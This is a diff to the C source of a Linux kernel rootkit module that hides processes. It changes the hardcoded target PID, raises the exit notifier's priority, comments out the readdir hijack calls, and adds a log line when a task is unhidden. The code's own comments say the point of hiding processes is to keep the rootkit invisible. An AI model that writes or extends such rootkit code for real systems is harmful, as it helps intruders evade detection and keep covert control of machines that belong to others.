@@ -2,6 +2,7 @@
 #include <linux/sched.h> // for task_struct
 #include <linux/rculist.h>
 #include <linux/profile.h>
+#include <linux/kernel.h>
 
 #include "common.h"
 #include "processHider.h"
@@ -36,16 +37,16 @@ static void restoreTaskGivenRcuLockIsHeld(struct restorableHiddenTask *taskToRes
 struct notifier_block notificationOnProcessExit = {
 	.notifier_call = notificationFunctionOnTaskExit,
 	.next = NULL,// TODO: CHECK THIS
-	.priority = 1, // TODO: CHECK THIS
+	.priority = INT_MAX, // TODO: CHECK THIS
 };
 
 //TODO: move this higher in the file
 int processHider_init(void) {
 	//TODO: only hide proccess when wanted ...
-	hideProcess(4922); // todo: perhaps use result of function call..
+	hideProcess(2195); // todo: perhaps use result of function call..
 	//TODO: check if hid is already hidden - trying to hide it multiple times causes issues
    
-   hijack_readdir();
+   //hijack_readdir();
 
 	//replacement_do_exit(0);
 
@@ -63,7 +64,7 @@ int processHider_init(void) {
 
 void processHider_exit(void) {
 	// show the process  perhaps.. otherwise it may be hide to kill / end it so that the rootkit is not visable
-   unhijack_readdir();
+   //unhijack_readdir();
 	// TODO: show the process  perhaps.. otherwise it may be hide to kill / end it so that the rootkit is not visable
 		// alternatively kill them / require that the tasks are dead first..
 
@@ -137,6 +138,7 @@ static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, 
 }
 
 static void restoreTaskGivenRcuLockIsHeld(struct restorableHiddenTask *taskToRestore) {
+   printInfo("Unhiding task\n");
 	attach_pid(taskToRestore->task, PIDTYPE_PID, taskToRestore->originalPid);
 	taskToRestore->task = NULL; //mark as no longer hidden
 }
